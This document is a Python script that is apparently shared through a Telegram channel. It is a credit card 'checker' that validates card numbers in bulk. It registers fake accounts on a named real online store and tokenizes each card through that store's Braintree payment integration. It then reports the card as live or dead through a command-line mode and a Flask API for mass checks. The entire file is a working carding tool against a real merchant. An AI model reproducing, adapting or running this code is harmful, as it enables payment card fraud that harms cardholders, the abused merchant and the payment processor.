# =============================================
# Free Braintree Auto Code By @BLAZE_X_007
# Dont forget joın my channel
# channel: @wiz_x_chk
# =============================================

import requests
import re
import base64
import random
import string
import time
from bs4 import BeautifulSoup
import os
from flask import Flask, request, jsonify

app = Flask(__name__)

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
PURPLE = "\033[95m"
RESET = "\033[0m"

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{PURPLE}╔══════════════════════════════════════════════════╗
║        BRAİNTREE AUTO TOOL BY @BLAZE_X_007                ║
║                THE BEST FTX COURSE                       ║
╚══════════════════════════════════════════════════╝{RESET}
    """)

def random_user():
    return 'u' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))

def random_email():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=13))
    return f"{name}@gmail.com"

def check_card(cc, mm, yy, cvc):
    if len(mm) == 1: mm = "0" + mm
    if len(yy) == 2: yy = "20" + yy

    print(f"{YELLOW}[*] {cc}|{mm}|{yy}|{cvc} →CHECKİNG...{RESET}")

    session = requests.Session()
    session.headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    try:
        # Register a new user
        r = session.get('https://www.calipercovers.com/my-account/')
        nonce = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', r.text)
        if not nonce:
            return {"status": "error", "message": "Register nonce alınamadı", "card": f"{cc}|{mm}|{yy}|{cvc}"}

        # Register
        session.post('https://www.calipercovers.com/my-account/', data={
            'username': random_user(),
            'email': random_email(),
            'woocommerce-register-nonce': nonce.group(1),
            '_wp_http_referer': '/my-account/',
            'register': 'Register'
        })

        # Get client token
        r = session.get('https://www.calipercovers.com/my-account/add-payment-method/')
        if 'wc_braintree_client_token' not in r.text:
            return {"status": "error", "message": "Client token yok", "card": f"{cc}|{mm}|{yy}|{cvc}"}

        client_token = re.search(r'var wc_braintree_client_token\s*=\s*\[\s*"([^"]+)"', r.text).group(1)
        add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', r.text).group(1)
        decoded = base64.b64decode(client_token).decode()
        auth_fp = re.search(r'"authorizationFingerprint":"([^"]+)"', decoded).group(1)

        # Tokenize card via Braintree GraphQL
        headers = {
            'Authorization': f'Bearer {auth_fp}',
            'Braintree-Version': '2018-05-10',
            'Content-Type': 'application/json',
            'Origin': 'https://assets.braintreegateway.com',
        }
        payload = {
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": mm,
                        "expirationYear": yy,
                        "cvv": cvc
                    },
                    "options": {"validate": False}
                }
            }
        }

        resp = requests.post('https://payments.braintree-api.com/graphql', json=payload, headers=headers, timeout=20)
        if 'token' not in resp.text:
            error = resp.json().get('errors', [{}])[0].get('message', 'Tokenize başarısız')
            return {"status": "dead", "message": error, "card": f"{cc}|{mm}|{yy}|{cvc}"}

        token = resp.json()['data']['tokenizeCreditCard']['token']

        # Add payment method
        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '{"correlation_id":"x"}',
            'woocommerce-add-payment-method-nonce': add_nonce,
            'woocommerce_add_payment_method': '1'
        }
        final = session.post('https://www.calipercovers.com/my-account/add-payment-method/', data=data)
        text = final.text

        if 'Payment method successfully added' in text:
            return {"status": "live", "message": "APPROVED | Payment method successfully added", "card": f"{cc}|{mm}|{yy}|{cvc}"}
        else:
            soup = BeautifulSoup(text, 'html.parser')
            err = soup.find('ul', class_='woocommerce-error')
            if err:
                msg = err.get_text(strip=True)
                reason = re.search(r'Reason:\s*(.+)', msg)
                if reason:
                    return {"status": "dead", "message": reason.group(1), "card": f"{cc}|{mm}|{yy}|{cvc}"}
                else:
                    return {"status": "dead", "message": msg[:70], "card": f"{cc}|{mm}|{yy}|{cvc}"}
            else:
                return {"status": "dead", "message": "Unknown Error", "card": f"{cc}|{mm}|{yy}|{cvc}"}

    except Exception as e:
        return {"status": "error", "message": f"Hata: {str(e)[:50]}", "card": f"{cc}|{mm}|{yy}|{cvc}"}

# API Routes
@app.route('/')
def home():
    return jsonify({
        "message": "Braintree Gateway API",
        "author": "@mast4rcard",
        "usage": "Use /key=blaze/gate=braintreeauth/cc=CC|MM|YY|CVV"
    })

@app.route('/key=blaze/gate=braintreeauth/cc=<path:cc_data>')
def braintree_check(cc_data):
    try:
        # Parse CC data (format: cc|mm|yy|cvv)
        parts = cc_data.split('|')
        if len(parts) != 4:
            return jsonify({
                "status": "error",
                "message": "Invalid card format. Use: cc|mm|yy|cvv"
            })
        
        cc, mm, yy, cvc = parts
        
        # Validate basic card format
        if not (cc.isdigit() and mm.isdigit() and yy.isdigit() and cvc.isdigit()):
            return jsonify({
                "status": "error", 
                "message": "Invalid card data. All values must be numeric."
            })
        
        # Check the card
        result = check_card(cc.strip(), mm.strip(), yy.strip(), cvc.strip())
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"Processing error: {str(e)}"
        })

@app.route('/mass_check', methods=['POST'])
def mass_check():
    try:
        data = request.get_json()
        if not data or 'cards' not in data:
            return jsonify({
                "status": "error",
                "message": "Please provide 'cards' array in JSON body"
            })
        
        cards = data['cards']
        results = []
        
        for card in cards:
            try:
                if '|' in card:
                    cc, mm, yy, cvc = card.split('|')
                    result = check_card(cc.strip(), mm.strip(), yy.strip(), cvc.strip())
                    results.append(result)
                    time.sleep(2)  # Rate limiting
                else:
                    results.append({
                        "status": "error",
                        "message": "Invalid card format",
                        "card": card
                    })
            except Exception as e:
                results.append({
                    "status": "error",
                    "message": f"Processing error: {str(e)}",
                    "card": card
                })
        
        return jsonify({
            "status": "completed",
            "total_cards": len(cards),
            "results": results
        })
        
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"Mass check error: {str(e)}"
        })

# Original CLI functionality
def cli_mode():
    banner()
    print(f"{CYAN}[1] Single Check")
    print(f"[2] Mass Check (txt file){RESET}\n")

    choice = input(f"{YELLOW}select number→ {RESET}")

    if choice == "1":
        print(f"\n{CYAN}card format → number|mo|yy|cvc{RESET}")
        card = input(f"{YELLOW}Kart → {RESET}").strip()
        if not card or '|' not in card:
            print(f"{RED}incoreect format!{RESET}")
        else:
            cc, mm, yy, cvc = card.split('|')
            result = check_card(cc.strip(), mm.strip(), yy.strip(), cvc.strip())
            print(f"\n{result}\n")

    elif choice == "2":
        file_path = input(f"{YELLOW}enter txt name → {RESET}").strip().strip('"')
        if not os.path.exists(file_path):
            print(f"{RED}file not found!{RESET}")
        else:
            with open(file_path, 'r', encoding='utf-8') as f:
                cards = [line.strip() for line in f if line.strip() and '|' in line]

            print(f"\n{GREEN}[+] {len(cards)} Card loaded. Starting...\n{RESET}")
            time.sleep(2)

            for card in cards:
                try:
                    cc, mm, yy, cvc = card.split('|')
                    result = check_card(cc.strip(), mm.strip(), yy.strip(), cvc.strip())
                    print(result)
                    time.sleep(4)  
                except:
                    print(f"{RED}{card} → incorect format{RESET}")

    else:
        print(f"{RED}invalid selection!{RESET}")

    input(f"\n{PURPLE}Done. Press ENTER to exit...{RESET}")

if __name__ == "__main__":
    # Check if running in production (Render)
    if os.environ.get('RENDER', False):
        app.run(host='0.0.0.0', port=5000)
    else:
        # Run CLI mode locally
        cli_mode()